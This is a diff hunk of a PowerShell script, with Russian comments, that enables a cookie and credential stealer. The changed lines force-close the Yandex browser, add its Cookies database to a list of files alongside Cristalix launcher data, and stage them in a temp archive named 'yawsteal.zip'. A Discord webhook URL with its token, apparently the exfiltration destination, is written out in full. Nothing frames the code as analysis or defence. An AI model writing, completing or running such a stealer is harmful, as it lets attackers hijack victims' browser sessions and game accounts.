@@ -11,13 +11,13 @@ $userName = Split-Path $env:USERPROFILE -Leaf
 
 # Ваш основной код
 $Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
-#Stop-Process -Name "browser" -Force
+Stop-Process -Name "browser" -Force
 
-#Start-Sleep -Seconds 1
+Start-Sleep -Seconds 1
 
 $filePaths = @(
     "C:\Users\$userName\.cristalix\.launcher"
-    #"C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
 )
 
 $zipFilePath = Join-Path $env:Temp "yawsteal.zip"
